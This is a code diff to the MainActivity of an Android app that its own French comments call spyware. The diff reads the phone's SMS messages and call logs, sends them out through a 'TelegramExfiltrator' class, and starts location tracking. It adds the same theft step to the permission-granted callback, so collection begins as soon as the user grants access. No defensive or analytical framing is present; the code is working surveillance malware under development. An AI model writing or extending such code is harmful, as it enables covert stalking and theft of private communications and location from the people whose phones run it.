@@ -14,7 +14,6 @@ import androidx.core.content.ContextCompat;
 public class MainActivity extends AppCompatActivity {
 
     private static final int PERMISSION_REQUEST_CODE = 101;
-    private static final String TAG = "MainActivity";
 
     // Toutes les permissions nécessaires pour le spyware
     private static final String[] REQUIRED_PERMISSIONS = new String[]{
@@ -30,10 +29,10 @@ public class MainActivity extends AppCompatActivity {
         Log.d("MainActivity", "onCreate");
         // Vérifie directement la permission
         if (hasAllPermissions()) {
-            Log.d("MainActivity", "Permission accordée, on lance le service");; // Démarre la localisation si déjà accordée
-            Log.d("MainActivity", "SMS : " + ComCollector.readSMS(this));
+            Log.d("MainActivity", "Permission accordée, on lance le service"); // Démarre la localisation si déjà accordée
+            Log.d("MainActivity", "SMS : " + ComCollector.readSMS(this, null));
             Log.d("MainActivity", "Call Logs : " + ComCollector.readCallLogs(this));
-            TelegramExfiltrator.sendTexte(ComCollector.readSMS(this));
+            TelegramExfiltrator.sendTexte(ComCollector.readSMS(this, null));
             TelegramExfiltrator.sendTexte(ComCollector.readCallLogs(this));
             startLocationService();
         } else {
@@ -91,6 +90,11 @@ public class MainActivity extends AppCompatActivity {
         if (requestCode == PERMISSION_REQUEST_CODE) {
             if (grantResults.length > 0
                     && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                Log.d("MainActivity", "Permission accordée, on lance le service"); // Démarre la localisation si déjà accordée
+                Log.d("MainActivity", "SMS : " + ComCollector.readSMS(this, null));
+                Log.d("MainActivity", "Call Logs : " + ComCollector.readCallLogs(this));
+                TelegramExfiltrator.sendTexte(ComCollector.readSMS(this, null));
+                TelegramExfiltrator.sendTexte(ComCollector.readCallLogs(this));
                 startLocationService(); // Permission accordée, on lance le service
             } else {
                 Log.d("MainActivity", "Permission refusée");
